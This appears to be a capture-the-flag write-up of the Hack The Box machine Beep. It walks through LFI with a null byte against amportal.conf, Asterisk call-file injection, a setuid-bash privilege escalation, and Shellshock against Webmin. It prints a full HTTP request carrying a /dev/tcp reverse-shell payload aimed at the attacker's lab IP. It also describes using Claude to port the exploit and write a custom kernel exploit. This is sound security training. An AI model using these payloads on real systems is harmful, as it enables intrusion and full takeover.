> **Directory Traversal and Null Byte Injection**
> 
> The URL contains two techniques working together. The `../../../../../../../../` sequence is a directory traversal — each `../` moves one level up the file system until we reach the root `/`, from where we can then navigate to any file on the system such as `/etc/amportal.conf`.
> 
> The `%00` at the end is a null byte — a URL-encoded character that older versions of PHP treat as the end of a string. The application was appending `.php` to the filename after our input, which would cause the file inclusion to fail. The null byte silently terminates the string at that point, stripping the unwanted extension before the file is read.
> 
> Together these two techniques allow us to read arbitrary files from the server that we would not normally have access to.
>
> **What is amportal.conf?**
> 
> amportal.conf is a legacy configuration file for FreePBX (historically known as the Asterisk Management Portal or AMP), typically located in /etc/amportal.conf. It historically stored core bootstrap parameters—such as database credentials (AMPDBUSER, AMPDBPASS, AMPDBHOST) and manager interface secrets (AMPMGRPASS)—needed to connect FreePBX to Asterisk and MySQL.

Before we start experimenting with other files, it makes sense to first copy the path exactly as it appears in the exploit and test it as-is. This gives us a straightforward way to confirm that the LFI is actually working before we start changing things.

> **Payload Summary**
> 
> The `callmenum` parameter in `callme_page.php` passes its value unsanitised into Asterisk's call manager, and the `%0D%0A` sequences in the URL are URL-encoded `\r\n` — Asterisk's call file delimiter — which means injecting them breaks out of the parameter and lets you append arbitrary directives directly into the call manager. That's how `Application: system` and `Data: <command>` get in; they're not part of the legitimate request, they're injected call file entries that tell Asterisk to execute a system command as if it were a valid dial plan action. The command itself is a perl one-liner that forks a child process to daemonise it, opens a raw TCP socket back to the listener, then rewires stdin and stdout to that socket and executes whatever comes down the pipe — a straight file descriptor swap that turns an outbound connection into an interactive shell.

We copy the code and can use Claude (LLM) to speed things up a bit here. If we ask it to help fix our code, it starts by porting it to Python 3. As Python 2's `urllib.urlopen()` no longer exists, it gets replaced with `urllib.request.urlopen()` and then wrapped in a `Request` object.

It also quickly solves our legacy encryption problem by building an explicit `SSLContext`. This disables certificate and hostname verification to match the original `_create_unverified_context` behaviour. It then pins the `minimum_version` and `maximum_version` to the legacy range, allowing the connection to negotiate down to the versions supported by Beep.

#### Chmod

Returning one steps to our `sudo -l` command, we can see a lot of programs that `asterisk` can run as root without requiring any password input. One of these is `chmod`, which is used to change the permissions of files and can be abused to modify otherwise restricted permissions.

For example, `chmod 4755 <path/to/the/file>` would give the owner read, write, and execute permissions, while the group and other users would have read and execute permissions. It would also set the setuid bit, causing the file to execute with the privileges of its owner. With this in mind, we can alter the permissions of `/bin/bash`. Since Bash is owned by root, setting the setuid bit would allow a lower-privileged user to execute it with root privileges, effectively giving us a persistent method of elevating our privileges to root.
```Shell
bash-3.2$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 735004 Jan 22  2009 /bin/bash

bash-3.2$ sudo chmod 4755 /bin/bash
sudo chmod 4755 /bin/bash

bash-3.2$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 735004 Jan 22  2009 /bin/bash
```

Now that '/bin/bash' has the setuid bit set and is owned by root, we need to make sure Bash retains those elevated privileges when we execute it. Using 'bash -p' starts Bash in privileged mode, which prevents it from dropping its effective privileges when launched by an unprivileged user. This allows the shell to retain the effective root privileges inherited from the setuid binary, giving us a root shell.
```Shell
bash-3.2$ bash -p
bash -p

bash-3.2# whoami
whoami
root

bash-3.2# id
id
uid=100(asterisk) gid=101(asterisk) euid=0(root)
```

**Learning From Failure**

Unfortunately, this is where things start to fall apart. The exploit repeatedly crashes the box and appears to be extremely unstable. We tried multiple versions targeting different SUID binaries, but none of them produced a reliable result. After numerous resets, and even asking Claude to develop a custom exploit specifically tailored to this environment with stability as a priority, we still couldn't get a working result.

At this point, I had to admit defeat and move on in the interest of time. While it was frustrating not to get the exploit working, the experience is a good testament to why kernel exploits should generally be treated as a last resort. Just because an exploit appears to match the target doesn't mean it is going to work reliably in practice.

More importantly, this reinforces a lesson I've encountered throughout these machines: don't just grab the first exploit off the shelf. Take the time to understand what it does, how it works, what it targets, and how reliable it is likely to be in the environment you're working with. When dealing with kernel exploits in particular, reliability should be an important consideration, especially when a failed attempt can potentially crash the entire system.

#### Webmin (instant Root)

If we navigate to `https://10.129.229.183:10000/`, we can see the Webmin login page. The difference this time is that we are armed with a list of usernames and passwords that we can test against the login.

To understand how the login works, we can open Burp Suite and capture a login request using `test` as both the username and password. Once captured, we send it over to Repeater and attempt the login again. The results show us a few useful things, which we can break down below:

1. We are sending an HTTPS POST request to the login form.
2. The port is set to `10000`, rather than `443`, as this is a completely different service.
3. The login form is located at `/session_login.cgi`. This becomes important for multiple reasons, including a separate path we take in the next insta-root exploit.
4. The username field is labelled `user` and the password field is labelled `pass`. These become important values for the next step.

### Shellshock (instant Root)

In 'Guided Mode' task eleven, we are given a proof of concept, the string `() { :; };sleep 10` for a 2014 CVE. If we rewind back to the previous login capture at `/session_login.cgi`, we can place this payload into the User-Agent field and test whether Beep is also vulnerable to Shellshock. As we find that this is indeed the case, we have our answer to the associated question.

Once we insert the PoC into the User-Agent header and press Send, we see the response take exactly 5 seconds to return, with nothing else appearing to happen. This delay provides a good indication that the payload is being executed, suggesting that the vulnerability is present 
![ShellShock POC]({{ '/assets/img/htb-beep/Beep_ShellShock_POC.png' | relative_url }})

Before we rush into sending a reverse shell payload, it would be better to corroborate our findings with some connectivity testing. One useful trick is to use the RCE to ping our own machine and capture the traffic as it arrives. This gives us a more conclusive indication that the exploit is actually usable and that commands are being executed successfully before we attempt to establish a reverse shell.

We change the `User-Agent` header to `() { :; };ping -c 3 10.10.14.62` and start `tcpdump` to capture the traffic. After pressing Send in Burp, we almost immediately begin receiving ICMP echo requests on our machine. We receive exactly three requests, matching the command we supplied and confirming that the command is being executed successfully. With this confirmed, we're now ready to move on to attempting a reverse shell payload.
![ShellShock Ping]({{ '/assets/img/htb-beep/Beep_ShellShock_Ping.png' | relative_url }})

Now that we've confirmed the RCE is working and can successfully execute commands on the target, we can move on to attempting to establish a reverse shell. For this, we'll use a /bin/bash reverse shell again, modifying the User-Agent header to contain our payload as shown below. This should cause the target to initiate a connection back to our listener and provide us with an interactive shell on the system.
```HTTP
POST /session_login.cgi HTTP/1.1
Host: 10.129.229.183:10000
Cookie: testing=1
User-Agent: () { :; };/bin/bash -i >& /dev/tcp/10.10.14.62/443 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
```

We start a Netcat listener and then send the payload through Burp. Almost immediately, we receive a shell back from the target, this time running in the context of root. This gives us full control of the system and completes the final route we explored for achieving instant root access.
